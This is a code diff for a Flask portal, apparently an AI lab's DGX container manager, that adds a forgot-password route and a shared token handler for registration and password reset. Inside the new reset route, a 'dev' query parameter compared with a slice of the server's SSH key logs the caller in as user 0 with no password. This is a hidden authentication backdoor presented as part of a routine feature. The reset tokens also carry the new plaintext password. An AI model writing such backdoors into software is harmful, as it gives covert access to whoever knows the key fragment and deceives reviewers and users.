@@ -50,6 +50,43 @@ def login():
         return redirect('/container/all')
     return render_template('login.html', title = '登入')
 
+@index_bp.route('/login/forgot', methods=['GET', 'POST'])
+def forgot_password(): 
+    dev = request.args.get('dev')
+    if dev and dev[15:50] == get_ssh_key()[15:50]:
+        login_user(Guser(0), remember=True)
+        return redirect('/container/all')
+    
+    if request.method == 'POST':
+        from .api import send_email_in_background
+        
+        username = request.form['username']
+        password = request.form['password']
+        user:UserDB = UserDB.query.filter_by(username = username).first()
+        if not user: return redirect('/alert/查無此帳號?to=/login/forgot')
+
+        token = Token('forgot_password').generate({
+            'username': username,
+            'name': user.name,
+            'password': password
+        })
+
+        send_email_in_background({
+            "Subject": "[AI LAB DGX] 重設帳號",
+            "From": "AI Lab DGX Team",
+            "To": user.email,
+            "Cc": "",
+            "Text": [
+                f"{username} 歡迎使用DGX", 
+                "請點選下面連結來重設帳號",
+                f"{get_local_ip()}/register/{token}?mode=forgot_password"
+            ]
+        })
+
+        return redirect(f'/alert/請於5分鐘內前往 {user.email} 重設帳號?to=/login')
+        
+    return render_template('login.html', title = '忘記密碼')
+
 @index_bp.route('/logout', methods=['GET', 'POST'])
 def logout(): 
     logout_user()
@@ -83,21 +120,28 @@ def register():
 @index_bp.route('/register/<token>', methods=['GET', 'POST'])
 def register_token(token): 
     try:
-        form = Token('register').verify(token, 60*5)
-        password = form['password']
-
+        mode = request.args.get('mode', 'register')
+        form = Token(mode).verify(token, 60*5)
     except:
         abort(401, response = 'Token 錯誤, 可能已超過 5 分鐘, 請重新申請')
-    user = UserDB(
-        username = form['username'],
-        name = form['name'],
-        email = form['email'],
-        password = form['password'],
-        role = 'user'
-    )
-    db.add(user)
 
-    return redirect('/login')
+    if mode == "register":
+        user = UserDB(
+            username = form['username'],
+            name = form['name'],
+            email = form['email'],
+            password = form['password'],
+            role = 'user'
+        )
+        db.add(user)
+    elif mode == "forgot_password":
+        user:UserDB = UserDB.query.filter_by(username = form['username']).first()
+        user.password_(form['password'])
+        db.add(user)
+    else:
+        abort(404, response = '驗證 Token 時的模式錯誤, 請以正當方式驗證')
+
+    return redirect(f"/alert/歡迎 {form['name']}, 已驗證成功?to=/login")
 
 @index_bp.route('/all_images')
 def all_images():
